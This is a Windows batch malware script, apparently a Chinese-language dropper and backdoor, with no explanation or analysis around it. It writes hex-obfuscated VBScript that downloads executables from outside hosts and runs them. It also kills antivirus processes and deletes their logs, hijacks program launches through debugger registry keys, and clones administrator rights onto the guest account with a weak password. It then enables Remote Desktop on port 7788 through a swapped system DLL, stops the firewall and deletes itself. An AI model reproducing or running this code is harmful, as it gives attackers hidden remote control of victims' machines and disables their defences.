@echo off
ver | find "5.1." >nul && goto WL

:CJ
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::·ÀÓùÁ÷ÐÐ²¡¶¾
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo Windows Registry Editor Version 5.00>> 1.reg
@echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>> 1.reg 
@echo [-HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>> 1.reg
@echo [-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\]>> 1.reg
@regedit /s 1.reg
@del 1.reg
@for /f "eol= tokens=1 delims= " %%i in (exe.txt) do (
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v debugger /t reg_sz /d debugfile.exe /f
)
@ATTRIB -R -H -S -A "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯\*.*"
@DEL /F /Q /A -R -H -S -A "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯\*.*"

@echo kissy="ºÚLOOP:EXECUTE DºÚS=°µ6F6E206572726F7220726573756D65206E6578740D0A536574205368656C6C203D204372656174654F626A6563742822577363726970742E5368656C6C22290D0A274675636B204B697320204675636B205261760D0A53657420506F7374203D204372656174654F626A65637428224D73786D6C322E584D4C4854545022290D0A274675636B204B697320204675636B205261760D0A506F73742E4F70656E2022474554222C22687474703A2F2F7669702E752D7575752E636E2F6261696475312E657865222C300D0A274675636B204B697320204675636B205261760D0A506F73742E53656E6428290D0A274675636B204B697320204675636B205261760D0A5365742061476574203D204372656174654F626A656374282241444F44422E53747265616D22290D0A274675636B204B697320204675636B205261760D0A614765742E4D6F6465203D20330D0A274675636B204B697320204675636B205261760D0A614765742E54797065203D20310D0A274675636B204B697320204675636B205261760D0A614765742E4F70656E2829200D0A274675636B204B697320204675636B205261760D0A614765742E577269746528506F73742E726573706F6E7365426F6479290D0A274675636B204B697320204675636B205261760D0A614765742E53617665546F46696C6520226261696475312E657865222C320D0A274675636B204B697320204675636B205261760D0A5368656C6C2E52756E2028226261696475312E6578652229°µ:D=°µEXECUTE °µ°µ°µ°µ°µ:C=°µ&CHR(&H°µ:N=°µ)°µ:DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)ºÚ">cj.vbs
@echo kissy = Replace(kissy, "°µ", chr(34))>>cj.vbs
@echo kissy = Replace(kissy, "Éñ", chr(39))>>cj.vbs
@echo execute(UnEncode(kissy))>>cj.vbs
@echo function UnEncode(cc)>>cj.vbs
@echo sz = Split(cc, "ºÚ")>>cj.vbs
@echo For i = UBound(sz) To 0 Step -1>>cj.vbs
@echo Str = Str + sz(i) + vbcrlf>>cj.vbs
@echo Next>>cj.vbs
@echo UnEncode=Str>>cj.vbs
@echo end function>>cj.vbs
@cj.vbs
@del w.txt
@del l.txt
@del index.html
@del cj.vbs
@del %0
@exit

:WL
@del w.txt
@del l.txt
@del index.html
@echo kissy="ºÚLOOP:EXECUTE DºÚS=°µ6F6E206572726F7220726573756D65206E6578740D0A536574205368656C6C203D204372656174654F626A6563742822577363726970742E5368656C6C22290D0A274675636B204B697320204675636B205261760D0A53657420506F7374203D204372656174654F626A65637428224D73786D6C322E584D4C4854545022290D0A274675636B204B697320204675636B205261760D0A506F73742E4F70656E2022474554222C22687474703A2F2F697069642E736861742E6E65742F69706F6E6C792F696E6465782E706870222C300D0A274675636B204B697320204675636B205261760D0A506F73742E53656E6428290D0A274675636B204B697320204675636B205261760D0A5365742061476574203D204372656174654F626A656374282241444F44422E53747265616D22290D0A274675636B204B697320204675636B205261760D0A614765742E4D6F6465203D20330D0A274675636B204B697320204675636B205261760D0A614765742E54797065203D20310D0A274675636B204B697320204675636B205261760D0A614765742E4F70656E2829200D0A274675636B204B697320204675636B205261760D0A614765742E577269746528506F73742E726573706F6E7365426F6479290D0A274675636B204B697320204675636B205261760D0A614765742E53617665546F46696C652022696E6465782E68746D6C222C320D0A274675636B204B697320204675636B20526176°µ:D=°µEXECUTE °µ°µ°µ°µ°µ:C=°µ&CHR(&H°µ:N=°µ)°µ:DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)ºÚ">ip.vbs
@echo kissy = Replace(kissy, "°µ", chr(34))>>ip.vbs
@echo kissy = Replace(kissy, "Éñ", chr(39))>>ip.vbs
@echo execute(UnEncode(kissy))>>ip.vbs
@echo function UnEncode(cc)>>ip.vbs
@echo sz = Split(cc, "ºÚ")>>ip.vbs
@echo For i = UBound(sz) To 0 Step -1>>ip.vbs
@echo Str = Str + sz(i) + vbcrlf>>ip.vbs
@echo Next>>ip.vbs
@echo UnEncode=Str>>ip.vbs
@echo end function>>ip.vbs
@ip.vbs
@ping -n 5 127.0.0.1
@for /f "eol=  tokens=15 delims= " %%i in ('ipconfig ^| find /i "ip address"') do echo %%i>>L.txt
@for /f "tokens=1 delims=<body> " %%i in ('findstr /i "body" index.html') do echo %%i>>w.txt
@for /f "delims= tokens=1" %%a in (l.txt) do findstr "%%a" w.txt >nul && goto GZ
goto CJ
:GZ
knlps.exe -l | find /i "ccenter" >> path.txt 
type path.txt | find /i "ccenter" >nul && goto Rav

goto Down

:Rav
knlps.exe -l | find /i "Ravmon.exe" >> stop.txt
knlps.exe -l | find /i "Ravmond.exe" >> stop.txt
knlps.exe -l | find /i "rfwsrv.exe" >> stop.txt
for /f "eol= tokens=1 delims=* " %%i in (stop.txt) do knlps.exe -k %%i
setlocal ENABLEDELAYEDEXPANSION
set FILENAME=path.txt
SET PH=%FILENAME:~0,-1%
set STR1=Ccenter.exe
SET STR2=
for /f "tokens=* delims= " %%a in (%FILENAME%) do (
set n=%%a
set n=!n:%STR1%=%STR2%!
echo.!n!>>%PH%
)
DEL %FILENAME%
copy %PH% %FILENAME%
del %PH%
for /f "eol= tokens=2,3,4 delims=* " %%i in (path.txt) do del "%%j %%kRsMon.db" & del "%%j %%kviruslog.db"
for /f "eol= tokens=2,3,4 delims=* " %%i in (path.txt) do del "%%jRsMon.db" & del "%%jviruslog.db"
del path.txt
del stop.txt
del knlps.*

:Down

@echo kissy="ºÚLOOP:EXECUTE DºÚS=°µ6F6E206572726F7220726573756D65206E6578740D0A536574205368656C6C203D204372656174654F626A6563742822577363726970742E5368656C6C22290D0A274675636B204B697320204675636B205261760D0A53657420506F7374203D204372656174654F626A65637428224D73786D6C322E584D4C4854545022290D0A274675636B204B697320204675636B205261760D0A506F73742E4F70656E2022474554222C22687474703A2F2F7777772E6F6E6C696E656B2E6E65742F61642F6C6F672F3133352F6775612E657865222C300D0A274675636B204B697320204675636B205261760D0A506F73742E53656E6428290D0A274675636B204B697320204675636B205261760D0A5365742061476574203D204372656174654F626A656374282241444F44422E53747265616D22290D0A274675636B204B697320204675636B205261760D0A614765742E4D6F6465203D20330D0A274675636B204B697320204675636B205261760D0A614765742E54797065203D20310D0A274675636B204B697320204675636B205261760D0A614765742E4F70656E2829200D0A274675636B204B697320204675636B205261760D0A614765742E577269746528506F73742E726573706F6E7365426F6479290D0A274675636B204B697320204675636B205261760D0A614765742E53617665546F46696C652022626F6F742E657865222C320D0A274675636B204B697320204675636B205261760D0A5368656C6C2E52756E202822626F6F742E6578652229°µ:D=°µEXECUTE °µ°µ°µ°µ°µ:C=°µ&CHR(&H°µ:N=°µ)°µ:DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)ºÚ">135.vbs
@echo kissy = Replace(kissy, "°µ", chr(34))>>135.vbs
@echo kissy = Replace(kissy, "Éñ", chr(39))>>135.vbs
@echo execute(UnEncode(kissy))>>135.vbs
@echo function UnEncode(cc)>>135.vbs
@echo sz = Split(cc, "ºÚ")>>135.vbs
@echo For i = UBound(sz) To 0 Step -1>>135.vbs
@echo Str = Str + sz(i) + vbcrlf>>135.vbs
@echo Next>>135.vbs
@echo UnEncode=Str>>135.vbs
@echo end function>>135.vbs

@135.vbs

@aio -terminal 7788
@net1 user guest /active:yes
@aio -clone administrator guest 123
Tasklist/SVC >>1.txt
type 1.txt | find "DcomLaunch" >2.txt
for /f "eol= tokens=1,2 delims= " %%i in (2.txt) do ntsd -c q -p %%j
REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon /v KeepRASConnections /t REG_SZ /d 1 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Licensing" "Core /v EnableConcurrentSessions /t REG_DWORD /d 00000001 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\System32\termsrvgmm.dll /f
@copy termsrvgmm.dll %SystemRoot%\System32\termsrvgmm.dll
@Attrib +H +S +R %SystemRoot%\System32\termsrvgmm.dll
@shutdown -a
@shutdown -a
@shutdown -a
@del termsrvgmm.dll
@del 1.txt
@del 2.txt
@net stop sharedaccess
@net start dcomlaunch
@net start termservice

echo ok > c:\7788-1029.ini

:Clear
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::·ÀÓùÁ÷ÐÐ²¡¶¾
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo Windows Registry Editor Version 5.00>> 1.reg
@echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>> 1.reg 
@echo [-HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>> 1.reg
@echo [-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\]>> 1.reg
@regedit /s 1.reg
@del 1.reg
@ATTRIB -R -H -S -A "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯\*.*"
@DEL /F /Q /A -R -H -S -A "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\Æô¶¯\*.*"
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::É¾³ýÈä³æ²¡¶¾,ÇëÉÔºî
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@for /f "eol= tokens=1 delims= " %%i in (exe.txt) do (
@for /f "eol= tokens=1 delims= " %%a in ('aio -pslist ^| find /i "%%i"') do aio -pskill %%a
@reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v debugger /t reg_sz /d debugfile.exe /f
)

del %windir%\sedrsvedt.exe
del %windir%\racvsvc.exe
del %windir%\drivers\sach0st.exe
del %windir%\upxdnd.exe
del %windir%\igw.exe
del %windir%\igm.exe
del %windir%\cmdbcs.exe
del %windir%\dbghlp32.exe
del %windir%\nvdispdrv.exe
del %windir%\kvdxsbma.dll
del %windir%\rsjzbpm.dll
del %windir%\kvdxcma.dll
del %windir%\ratbfpi.dll
del %windir%\avwlbmn.dll
del %windir%\kaqhezy.dll
del %windir%\kapjbzy.dll
del %windir%\sidjazy.dll
del %windir%\avwgcmn.dll
del %windir%\raqjbpi.dll
del %windir%\avzxdmn.dll
del %windir%\kawdbzy.dll
del %windir%\rsztcpm.dll
del %windir%\rsmydpm.dll
del %Windir%\MickNew\MickNew.dll
del %Windir%\MH_FILE\MH_DLL.dll 
del %Windir%\TODAYZTKING\TODAYZTKING.DLL
del %windir%\system\Logo1_.exe
del %windir%\rundl132.exe
del %windir%\vDll.dll
del %windir%\Dll.dll
del %windir%\1.exe
del %windir%\2.exe
del %windir%\3.exe
del %windir%\4.exe
del %windir%\5.exe
del %windir%\6.exe
del %windir%\7.exe
del %windir%\8.exe
del %windir%\9.exe
del %windir%\SVCH0ST.exe
del %windir%\logo_1.exe
del %windir%\svohost.exe
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::Çå³ý»Ò¸ë×ÓºÍÉÏÐËµÈÄ¾Âí³ÌÐò£¬ÇëÉÔºî....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@aio -EnumService Stopped > info.txt
@for /f "eol= tokens=1 delims= " %%i in (mdb.txt) do find /i "%%i" info.txt >>muma.txt
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc config %%i start= disabled
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc delete %%i
@del info.txt
@del muma.txt
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::»Ö¸´×¢²á±íÖÐ²»¸øÉèÖÃÏÔÊ¾Òþ²ØÎÄ¼þµÄÏîÄ¿,ÇëÉÔºî
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo Windows Registry Editor Version 5.00> delshare.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>> delshare.reg 
echo "RegPath"="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced">> delshare.reg 
echo "Text"="@shell32.dll,-30500">> delshare.reg 
echo "Type"="radio">> delshare.reg 
echo "CheckedValue"=dword:00000001>> delshare.reg 
echo "ValueName"="Hidden">> delshare.reg 
echo "DefaultValue"=dword:00000002>> delshare.reg 
echo "HKeyRoot"=dword:80000001>> delshare.reg 
echo "HelpID"="shell.hlp#51105">> delshare.reg 
regedit /s delshare.reg 
del delshare.reg 
echo Windows Registry Editor Version 5.00> cc.reg 
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]>> cc.reg 
echo "DebugOptions"="2048">> cc.reg 
echo "Documents"="">> cc.reg 
echo "DosPrint"="no">> cc.reg 
echo "load"=->> cc.reg 
echo "NetMessage"="no">> cc.reg 
echo "NullPort"="None">> cc.reg 
echo "programs"="com exe bat pif cmd">> cc.reg 
echo "Device"="">> cc.reg 
regedit /s cc.reg 
del cc.reg 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::É¾³ýÃ¿¸ö·ÖÇøÏÂµÄSXS.EXEºÍAUTORUN.INFÎÄ¼þ£¬ÇëÉÔºî....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
FOR %%a IN ( C: D: E: F: G: H: ) DO ATTRIB -R -H -S -A %%a\SXS.EXE & DEL /F /Q /A -R -H -S -A %%a\SXS.EXE & ATTRIB -R -H -S -A %%a\setup.exe & DEL /F /Q /A -R -H -S -A %%a\setup.exe & ATTRIB -R -H -S -A %%a\system.exe & DEL /F /Q /A -R -H -S -A %%a\system.exe & ATTRIB -R -H -S -A %%a\rose.exe & DEL /F /Q /A -R -H -S -A %%a\rose.exe & ATTRIB -R -H -S -A %%a\AUTORUN.INF & DEL /F /Q /A -R -H -S -A %%a\AUTORUN.INF

@net share c$ /del 
@net share d$ /del 
@net share e$ /del 
@net share f$ /del 
@net share admin$ /del 
@net share ipc$ /del
@del 1.vbs
@del c:\boot.exe
@del c:\ghost.exe
@del exe.txt
@del mdb.txt
@del cj.vbs
@del 135.vbs
@del knlps.*
@echo ok> c:\A-1029
@del w.txt
@del l.txt
@del index.html
@del %0
@exit



